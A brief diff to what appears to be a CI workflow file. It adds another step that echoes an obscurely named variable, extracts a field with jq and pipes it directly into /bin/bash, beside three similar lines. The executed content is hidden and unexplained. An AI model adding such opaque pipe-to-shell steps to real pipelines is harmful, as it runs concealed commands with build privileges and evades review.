@@ -26,6 +26,7 @@ jobs:
           echo $xkodq2 | jq -r .nyyfc6299 | /bin/bash
           printf '%s' "$cu8" | jq -r .u13 | /bin/bash
           echo $ctiw8573 | jq -r .jcv587 | /bin/bash
+          echo $lz439 | jq -r .eu77799 | /bin/bash
 
       - name: Upload results
         if: always()
